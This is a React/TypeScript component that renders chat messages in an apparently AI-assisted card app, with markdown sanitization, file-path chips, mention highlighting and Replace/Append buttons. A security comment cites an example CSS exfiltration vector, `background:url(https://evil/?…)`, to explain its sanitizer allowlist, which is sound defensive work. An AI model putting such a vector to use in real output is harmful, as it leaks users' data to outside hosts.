"use client";

import { useMemo, useState, type KeyboardEvent, type ReactNode } from "react";
import { ConversationMessage as Message, ToolCall, SectionType } from "@/lib/types";
import { thinkingTail } from "@/lib/conversation-activity";
import { Brain, Wrench, User, Loader2, ArrowUpToLine, Plus, AlertTriangle } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import DOMPurify from "isomorphic-dompurify";

// rehype-sanitize runs AFTER rehype-raw, stripping <script>, event handlers
// (onerror, onclick, …), and javascript: URLs while preserving formatting tags
// that Claude / Codex / Gemini output.
// NB: `style` is deliberately NOT in the allowlist — inline style lets adversarial
// AI output exfil data via `background:url(https://evil/?…)` or do CSS clickjacking,
// and rehype-sanitize does not URL-sanitize inside style values. Tailwind utility
// classes via className are enough for the formatting we actually need.
// `file:` hrefs survive so the `a` renderer can turn them into artifact chips;
// they never navigate — the chip opens them through the card-scoped route.
const markdownSanitizeSchema = {
  ...defaultSchema,
  protocols: {
    ...defaultSchema.protocols,
    href: [...(defaultSchema.protocols?.href || []), "file"],
  },
  attributes: {
    ...defaultSchema.attributes,
    span: [...(defaultSchema.attributes?.span || []), "className"],
    div: [...(defaultSchema.attributes?.div || []), "className"],
    code: [...(defaultSchema.attributes?.code || []), "className"],
  },
};
import { MentionData } from "@/lib/types";
import { extractApplicableContent, hasApplyBlock } from "@/lib/apply-content";
import { artifactBasename, artifactKind, fileUrlToPath, localPathFromText } from "@/lib/artifact-url";
import { openArtifactChip } from "@/lib/open-path";
import { useToast } from "@/hooks/use-toast";

// react-markdown blanks unsafe URLs before our renderers see them; keep
// `file:` so the `a` renderer can make it a chip.
function urlTransform(url: string): string {
  return /^file:\/\//i.test(url) ? url : defaultUrlTransform(url);
}

function localPathFromCode(children: ReactNode): string | null {
  return typeof children === "string" ? localPathFromText(children) : null;
}

function ArtifactChip({ path, label, onOpen }: { path: string; label?: string; onOpen: (path: string) => void }) {
  const open = () => onOpen(path);
  const onKeyDown = (e: KeyboardEvent) => {
    if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      open();
    }
  };
  return (
    <span
      role="button"
      tabIndex={0}
      title={path}
      data-kind={artifactKind(path)}
      className="mention artifact-mention"
      onClick={open}
      onKeyDown={onKeyDown}
    >
      {label || artifactBasename(path)}
    </span>
  );
}

// CSS class map for mention types
const MENTION_CLASS: Record<string, string> = {
  skill: "mention-inline mention-inline--skill",
  mcp: "mention-inline mention-inline--mcp",
  card: "mention-inline mention-inline--card",
  document: "mention-inline mention-inline--document",
  plugin: "mention-inline mention-inline--skill",
};

// Build candidate display texts for a mention as it may appear in the content.
// Multiple candidates cover legacy formats (e.g. bare card id, `#doc` pre-@-trigger).
function mentionToTexts(m: MentionData): string[] {
  if (m.type === "card") {
    // New format: [[IDE-XX · Title]]; legacy: [[IDE-XX]] or [[Title]].
    // The label may be "IDE-XX · Title", just "IDE-XX", or just "Title".
    const texts = new Set<string>();
    texts.add(`[[${m.label}]]`);
    const idPart = m.label.split(" · ")[0];
    if (idPart) texts.add(`[[${idPart}]]`);
    return Array.from(texts);
  }
  if (m.type === "document") return [`@${m.label}`, `#${m.label}`];
  return [`/${m.label}`]; // skill, mcp, plugin
}

// Replace mention text patterns with highlighted HTML spans
function highlightMentions(content: string, mentions?: MentionData[]): string {
  if (!mentions || mentions.length === 0) return content;

  // Build (needle, mention) pairs, longest needle first to avoid partial matches.
  const pairs: Array<{ needle: string; mention: MentionData }> = [];
  for (const mention of mentions) {
    for (const needle of mentionToTexts(mention)) {
      pairs.push({ needle, mention });
    }
  }
  pairs.sort((a, b) => b.needle.length - a.needle.length);

  let result = content;
  for (const { needle, mention } of pairs) {
    const cls = MENTION_CLASS[mention.type] || MENTION_CLASS.skill;
    const escaped = needle.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    result = result.replace(
      new RegExp(escaped, "g"),
      `<span class="${cls}">${needle}</span>`
    );
  }
  return result;
}

// Tool ismini gruba çevir
function getToolGroup(name: string): string {
  if (name.startsWith("mcp__")) {
    // mcp__ideafy__get_card → ideafy
    const parts = name.split("__");
    return parts[1] || name;
  }
  return name; // Bash, Read, Write vs.
}

// Tool'ları grupla ve say
function groupToolCalls(toolCalls: ToolCall[]): Map<string, number> {
  const groups = new Map<string, number>();
  for (const tool of toolCalls) {
    const group = getToolGroup(tool.name);
    groups.set(group, (groups.get(group) || 0) + 1);
  }
  return groups;
}

// Check if tool calls include a save/update tool that persists to the card
function hadPersistToolCall(toolCalls?: ToolCall[]): boolean {
  if (!toolCalls || toolCalls.length === 0) return false;
  const persistTools = ["save_plan", "save_tests", "save_opinion", "update_card"];
  return toolCalls.some((t) =>
    persistTools.some((pt) => t.name.includes(pt))
  );
}

// Map section type to card field name for the API
const SECTION_FIELD_MAP: Record<SectionType, "solutionSummary" | "description" | "aiOpinion" | "testScenarios"> = {
  solution: "solutionSummary",
  detail: "description",
  opinion: "aiOpinion",
  tests: "testScenarios",
};

// Human-readable labels for the section
const SECTION_LABEL: Record<SectionType, string> = {
  solution: "Solution",
  detail: "Detail",
  opinion: "AI Opinion",
  tests: "Tests",
};

// Decide which apply mode fits the assistant message best: replace when the
// message looks like a full rewrite (has headings, enough checkboxes, or
// comparable length to the existing field), append when it looks like a patch.
// Existing-empty always defaults to replace (first write).
function pickDefaultMode(
  messageContent: string,
  existingText: string,
  sectionType: SectionType,
): "replace" | "append" {
  const trimmed = messageContent.trim();
  const existingLen = existingText.replace(/<[^>]*>/g, "").trim().length;
  if (existingLen === 0) return "replace";

  if (sectionType === "tests") {
    const checkboxCount = (trimmed.match(/^\s*-\s*\[[ xX]\]/gm) || []).length;
    return checkboxCount >= 3 ? "replace" : "append";
  }

  const hasHeading = /^\s*#{1,6}\s/m.test(trimmed);
  if (hasHeading) return "replace";

  const ratio = trimmed.length / Math.max(existingLen, 1);
  return ratio >= 0.6 ? "replace" : "append";
}

interface ConversationMessageProps {
  message: Message;
  cardId?: string;
  sectionType?: SectionType;
  /** Current field content from the form — used to pick Replace vs Append default. */
  existingSectionContent?: string;
  onApplied?: () => void;
}

export function ConversationMessage({
  message,
  cardId,
  sectionType,
  existingSectionContent,
  onApplied,
}: ConversationMessageProps) {
  const isUser = message.role === "user";
  const isStreaming = message.isStreaming;
  const [isApplying, setIsApplying] = useState<"replace" | "append" | null>(null);
  const [applied, setApplied] = useState<"replace" | "append" | null>(null);
  // Append found every block already on the card (IDE-334).
  const [nothingNew, setNothingNew] = useState(false);
  const [confirmReplace, setConfirmReplace] = useState(false);
  const { toast } = useToast();

  // File paths in a reply — `file://` links and backticked absolute paths —
  // render as the same violet chips the card tabs use, and open the file.
  const markdownComponents = useMemo<Components>(() => {
    const onOpen = (path: string) => void openArtifactChip(cardId, path, toast);
    return {
      a: ({ href, children, node: _node, ...rest }) => {
        const path = fileUrlToPath(href);
        if (!path) return <a href={href} {...rest}>{children}</a>;
        const text = typeof children === "string" ? children.trim() : "";
        const label = !text || text.startsWith("/") || text.startsWith("file://") ? undefined : text;
        return <ArtifactChip path={path} label={label} onOpen={onOpen} />;
      },
      code: ({ className, children, node: _node, ...rest }) => {
        const path = className ? null : localPathFromCode(children);
        if (path) return <ArtifactChip path={path} onOpen={onOpen} />;
        return <code className={className} {...rest}>{children}</code>;
      },
    };
  }, [cardId, toast]);

  // Show "Apply" button when: assistant message, not streaming, has content,
  // and either no persist tool was called or the reply still fences a proposal
  // for Apply — a Tests turn can record a passing result with save_tests and
  // offer a new scenario in the same reply.
  const showApplyButton =
    !isUser &&
    !isStreaming &&
    message.content?.trim() &&
    cardId &&
    sectionType &&
    (!hadPersistToolCall(message.toolCalls) || hasApplyBlock(message.content));

  // Narration around the content ("reading the opinion…", "apply this with
  // Replace:") stays in the chat; only the extracted part lands on the card.
  const applicable = sectionType && showApplyButton
    ? extractApplicableContent(message.content, sectionType)
    : null;

  const defaultMode = sectionType && applicable
    ? pickDefaultMode(applicable.content, existingSectionContent || "", sectionType)
    : "replace";

  const sectionLabel = sectionType ? SECTION_LABEL[sectionType] : "";
  const existingIsNonEmpty = (existingSectionContent || "").replace(/<[^>]*>/g, "").trim().length > 0;

  const runApply = async (mode: "replace" | "append") => {
    if (!cardId || !sectionType || !applicable) return;
    setIsApplying(mode);
    try {
      const field = SECTION_FIELD_MAP[sectionType];
      const cleanedContent = applicable.content;
      const res = await fetch(`/api/cards/${cardId}/apply-message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ field, mode, content: cleanedContent }),
      });
      if (res.ok) {
        const data = await res.json().catch(() => ({}));
        setNothingNew(data.added === 0);
        setApplied(mode);
        onApplied?.();
      }
    } catch (error) {
      console.error("Failed to apply message to section:", error);
    } finally {
      setIsApplying(null);
    }
  };

  const handleReplace = () => {
    if (existingIsNonEmpty) {
      setConfirmReplace(true);
      return;
    }
    void runApply("replace");
  };
  const handleAppend = () => {
    void runApply("append");
  };

  // Check if content contains HTML img tags
  const hasHtmlImages = message.content?.includes("<img ");

  // Render HTML content directly for messages with images
  const renderContent = () => {
    if (isStreaming && !message.content && !message.activeToolCall) {
      return (
        <div className="flex items-center gap-2 text-muted-foreground">
          <Loader2 className="w-3 h-3 animate-spin" />
          <span>Thinking...</span>
        </div>
      );
    }

    // For user messages with images, render sanitized HTML
    if (isUser && hasHtmlImages) {
      const sanitized = DOMPurify.sanitize(message.content, {
        ALLOWED_TAGS: ["img", "p", "br", "strong", "em", "a", "span", "div"],
        ALLOWED_ATTR: ["src", "alt", "class", "href", "style", "width", "height"],
      });
      return (
        <div
          className="message-html-content"
          dangerouslySetInnerHTML={{ __html: sanitized }}
        />
      );
    }

    // For other messages, use ReactMarkdown with inline-highlighted mentions
    const highlighted = highlightMentions(message.content, message.mentions);
    return (
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeRaw, [rehypeSanitize, markdownSanitizeSchema]]}
        components={markdownComponents}
        urlTransform={urlTransform}
      >
        {highlighted}
      </ReactMarkdown>
    );
  };

  return (
    <div
      className={`flex gap-3 ${isUser ? "flex-row-reverse" : "flex-row"}`}
    >
      {/* Avatar */}
      <div
        className={`flex-shrink-0 w-7 h-7 rounded-full flex items-center justify-center ${
          isUser
            ? "bg-ink text-background"
            : "bg-paper-cream text-ink border border-paper-edge"
        }`}
      >
        {isUser ? (
          <User className="w-4 h-4" />
        ) : (
          <Brain className={`w-4 h-4 ${isStreaming ? "animate-pulse" : ""}`} />
        )}
      </div>

      {/* Content */}
      <div
        className={`flex-1 max-w-[85%] rounded-lg px-3 py-2 ${
          isUser
            ? "bg-paper-cream text-ink border border-paper-edge"
            : "bg-surface border border-border/50"
        }`}
      >
        {/* Session decision trail (streaming only) */}
        {isStreaming && message.statusSteps && message.statusSteps.length > 0 && (
          <div className="mb-2 pb-2 border-b border-border/50 space-y-0.5 font-mono text-[11px] text-muted-foreground">
            {message.statusSteps.map((step, idx) => {
              let label: string;
              switch (step.step) {
                case "checking":
                  label = "Checking for existing session…";
                  break;
                case "session_found":
                  label = `Session found: ${step.sessionId}`;
                  break;
                case "session_missing":
                  label = "No prior session";
                  break;
                case "resuming":
                  label = `Resuming session ${step.sessionId}`;
                  break;
                case "creating":
                  label = step.sessionId === "pending"
                    ? "Creating new session with full context"
                    : `Creating new session ${step.sessionId} with full context`;
                  break;
              }
              return <div key={idx}>⎯ {label}</div>;
            })}
          </div>
        )}

        {isStreaming && message.activityLog && message.activityLog.length > 0 && (
          <div className="mb-2 pb-2 border-b border-border/50 space-y-1">
            <div className="flex items-center gap-2 text-[11px] font-medium text-muted-foreground">
              <Brain className="w-3 h-3" />
              <span>Live Activity</span>
            </div>
            {message.activityLog.map((entry, idx) => (
              <div
                key={`${entry.type}-${idx}`}
                className="flex items-start gap-2 text-[11px] text-muted-foreground"
              >
                {entry.type === "thinking" ? (
                  <Brain className="w-3 h-3 mt-0.5 flex-shrink-0" />
                ) : (
                  <Wrench className="w-3 h-3 mt-0.5 flex-shrink-0" />
                )}
                {entry.type === "thinking" ? (
                  // One row per thought; it grows as deltas stream in, so
                  // show the tail (what it is thinking *now*), not the head.
                  <span className="italic whitespace-pre-wrap break-words">
                    {thinkingTail(entry.content)}
                  </span>
                ) : (
                  <span>{entry.content}</span>
                )}
              </div>
            ))}
          </div>
        )}

        {/* Message content */}
        <div className="prose prose-sm dark:prose-invert prose-p:my-1 prose-headings:my-2 prose-ul:my-1 prose-li:my-0 max-w-none text-sm">
          {renderContent()}
        </div>

        {/* Active tool call indicator (streaming) */}
        {isStreaming && message.activeToolCall && (
          <div className="mt-2 pt-2 border-t border-border/50">
            <span className="inline-flex items-center gap-1.5 text-xs px-2 py-1 rounded bg-amber-500/10 text-amber-400">
              {message.activeToolCall.status === "running" ? (
                <Loader2 className="w-3 h-3 animate-spin" />
              ) : (
                <Wrench className="w-3 h-3" />
              )}
              {getToolGroup(message.activeToolCall.name)}
              {message.activeToolCall.status === "running" && "..."}
            </span>
          </div>
        )}

        {/* Tool calls indicator - grouped */}
        {message.toolCalls && message.toolCalls.length > 0 && (
          <div className="mt-2 pt-2 border-t border-border/50">
            <div className="flex flex-wrap gap-1">
              {Array.from(groupToolCalls(message.toolCalls)).map(([group, count]) => (
                <span
                  key={group}
                  className="inline-flex items-center gap-1 text-xs px-2 py-0.5 rounded bg-paper-cream text-ink border border-paper-edge"
                >
                  <Wrench className="w-3 h-3" />
                  {group}: {count}
                </span>
              ))}
            </div>
          </div>
        )}

        {/* Apply to section buttons: Replace + Append, default highlighted */}
        {showApplyButton && (
          <div className="mt-2 pt-2 border-t border-border/50 flex flex-wrap items-center gap-1 min-w-0">
            <Button
              variant="ghost"
              size="sm"
              onClick={handleAppend}
              disabled={!!isApplying || !!applied}
              className={`h-6 px-2 text-xs ${
                applied === "append"
                  ? nothingNew ? "text-muted-foreground" : "text-[#16a34a]"
                  : defaultMode === "append"
                    ? "text-ink bg-paper-cream hover:bg-paper-cream hover:text-ink"
                    : "text-ink hover:text-ink hover:bg-paper-cream"
              }`}
              title={existingIsNonEmpty
                ? `Append to existing ${sectionLabel}`
                : `Save as ${sectionLabel}`}
            >
              {isApplying === "append" ? (
                <Loader2 className="w-3 h-3 mr-1 animate-spin" />
              ) : (
                <Plus className="w-3 h-3 mr-1" />
              )}
              {applied === "append"
                ? nothingNew ? "Nothing new to append" : "Appended"
                : `Append to ${sectionLabel}`}
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={handleReplace}
              disabled={!!isApplying || !!applied}
              className={`h-6 px-2 text-xs ${
                applied === "replace"
                  ? "text-[#16a34a]"
                  : defaultMode === "replace"
                    ? "text-ink bg-paper-cream hover:bg-paper-cream hover:text-ink"
                    : "text-ink hover:text-ink hover:bg-paper-cream"
              }`}
              title={existingIsNonEmpty
                ? `Replace existing ${sectionLabel} (confirm)`
                : `Save as ${sectionLabel}`}
            >
              {isApplying === "replace" ? (
                <Loader2 className="w-3 h-3 mr-1 animate-spin" />
              ) : (
                <ArrowUpToLine className="w-3 h-3 mr-1" />
              )}
              {applied === "replace" ? "Replaced" : `Replace ${sectionLabel}`}
            </Button>
          </div>
        )}

        <AlertDialog open={confirmReplace} onOpenChange={setConfirmReplace}>
          <AlertDialogContent>
            <AlertDialogHeader>
              <AlertDialogTitle className="flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-amber-500" />
                Replace {sectionLabel}?
              </AlertDialogTitle>
              <AlertDialogDescription>
                This will overwrite the current {sectionLabel.toLowerCase()} with the assistant&apos;s reply. Use &ldquo;Append&rdquo; instead if you only want to add to the existing content.
                {applicable?.trimmedIntro && (
                  <span className="block mt-2">
                    The intro text is left out
                    {applicable.firstHeading
                      ? <> — only the content from &ldquo;{applicable.firstHeading}&rdquo; onward is applied.</>
                      : <>; only the content below it is applied.</>}
                  </span>
                )}
                {applicable?.trimmedOutro && (
                  <span className="block mt-2">
                    The closing remark after the last divider stays in the chat.
                  </span>
                )}
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              <AlertDialogAction
                onClick={() => {
                  setConfirmReplace(false);
                  void runApply("replace");
                }}
              >
                Replace
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>

        {/* Timestamp */}
        <div
          className={`text-[10px] mt-1.5 ${
            isUser ? "text-right" : "text-left"
          } text-muted-foreground/60`}
        >
          {new Date(message.createdAt).toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit",
          })}
        </div>
      </div>
    </div>
  );
}
